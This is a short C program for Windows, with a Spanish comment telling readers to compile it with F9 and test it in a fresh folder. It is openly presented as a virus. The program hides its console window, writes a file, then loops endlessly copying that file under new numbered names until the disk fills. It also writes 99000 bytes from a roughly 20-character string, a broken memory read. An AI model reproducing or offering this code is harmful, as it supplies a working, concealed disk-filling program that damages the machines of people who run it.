//Nota ¡¡IMPORTANTE!! solo compilar con F9 para generar el ejecutable y lo guardan en una carpeta nueva para hacer la prueba
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <fcntl.h>
#define _WIN32_WINNT 0X0500
int main(){
	HWND ventana=GetConsoleWindow();
	ShowWindow(ventana, SW_MINIMIZE);
	ShowWindow(ventana,SW_HIDE);
	int right;
	char arcname[20]="virus-xtremeHack\0",num[10];
	right=creat(arcname,755);
	write(right,"You have been hacked",99000);
	close(right);
	while(1){
		itoa(right,num,10);
		strcpy(arcname,"virus-xtremeHack\0");
		strcat(arcname,num);
		CopyFile("virus-xtremeHack\0",arcname,1);
		right++;
	}
	return (0);
}
